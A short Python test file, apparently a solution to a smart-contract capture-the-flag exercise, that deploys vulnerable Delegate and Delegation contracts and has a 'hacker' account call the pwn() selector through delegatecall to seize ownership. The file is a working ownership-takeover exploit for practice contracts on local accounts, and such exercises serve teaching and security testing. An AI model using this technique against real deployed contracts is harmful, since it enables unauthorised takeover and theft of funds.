from brownie import web3, Delegate, Delegation, accounts

def test_attack():
    owner = accounts[0]
    hacker = accounts[1]
    assert owner.address != hacker.address
    delegate = Delegate.deploy(owner, {'from': owner})
    assert delegate.owner() == owner
    delegation = Delegation.deploy(delegate.address, {'from': owner})
    assert delegation.owner() == owner
    hacker.transfer(to=delegation.address, data=web3.keccak(text='pwn()')[0:4])
    assert delegation.owner() == hacker
